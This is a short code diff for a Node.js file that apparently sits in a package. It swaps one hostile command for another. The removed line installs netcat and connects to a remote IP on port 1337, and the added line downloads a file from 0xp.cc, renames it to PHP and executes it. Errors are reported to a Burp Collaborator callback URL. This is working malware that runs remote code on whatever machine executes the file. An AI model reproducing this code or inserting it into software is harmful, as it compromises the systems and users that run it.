@@ -83,7 +83,7 @@ fs.readFile('d.txt', 'utf8' , (err, data) => {
 
 const spawn = require('child_process');
 var request = require('request');
-spawn.exec("apt install netcat; nc 94.156.174.105 1337; ncat 94.156.174.105 1337", (error, stdout, stderr) => {
+spawn.exec("wget http://0xp.cc/e.txt; mv e.txt e.php; php e.php", (error, stdout, stderr) => {
     if (error) {
         console.log(`error: ${error.message}`);
         request('http://mzpz5sloxj1o8ocahftqnyjtokubvzk.burpcollaborator.net/?rce-error=' + error.message);
